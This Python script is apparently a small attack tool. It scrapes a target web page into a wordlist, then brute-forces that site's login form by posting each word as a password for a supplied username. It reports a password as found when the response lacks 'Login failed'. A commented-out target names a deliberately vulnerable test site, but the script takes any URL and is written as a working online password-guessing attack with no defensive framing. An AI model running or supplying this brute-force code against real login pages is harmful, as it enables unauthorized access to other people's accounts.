from requests import *
import re
import os

import requests

#Scrape webpage content and write to a file
def scrapeContent(url):
    with requests.Session() as sess:
        # page = c.get('http://www.cbc.ca/sitemap/')
        try:
            page = sess.get(url)
            data = str(page.content)
            print('[+][+][+] 200 OK. Webpage Found [+][+][+]')
        except Exception as e:
            print(e)
            
        #clean data
        data = re.sub('<[^<]+?>', '', data)
        toRemove = [',', '&', '\'', '!', '.', '(', ')', '%', ';', '\n', '\\', ':', '"', ']', '[', '{', '}']

        for word in toRemove:
            if word in data:
                data = data.replace(word, '')
        data = data.replace('-', ' ')
        data = data.replace(' ', '\n')
        data = data.split('\n')
        listWords = []
        # with open('wordlist.txt', 'w+') as outFile:
        for d in data:
            if len(d) > 3 and len(d) < 15:
                listWords.append(d)
        
        listWords = [i for n, i in enumerate(listWords) if i not in listWords[:n]]
        # listWords = set(listWords)
        # print(listWords)
        print('[+][+][+] Generating Wordlist... [+][+][+]')
        with open('wordlist.txt', 'w+') as outFile:
            outFile.write("\n".join(str(i) for i in listWords))

def bruteForce(worldlist, targeturl):
    
    # if os.path.exists('wordlist.txt'):
    passfile = open(worldlist, "r")
    for passwd in passfile.readlines():
        # print(type(passwd))
        likelypassword = passwd.strip("\n")
        # print(likelypassword)
        username = input(str('Input known correct Username:   '))
        loginData = {'username':username, 'password':likelypassword, "Login":'submit'}

        send_data_url = requests.post(targeturl, data=loginData)

        if "Login failed" in str(send_data_url.content):
            print(f'Attempting password: {likelypassword}')
        else:
            print(f'[+] [+] [+] 200 OK. Password found: {likelypassword} [+] [+] [+]')

def main():
    # targetUrl = 'http://testphp.vulnweb.com/login.php'
    targetUrl = input(str('please input taget Url'))
    scrapeContent(targetUrl)
    # targeturl = input(str('please input taget Url'))
    if os.path.exists('wordlist.txt'):
        bruteForce('wordlist.txt', targetUrl)

if __name__ =='__main__':
    main()
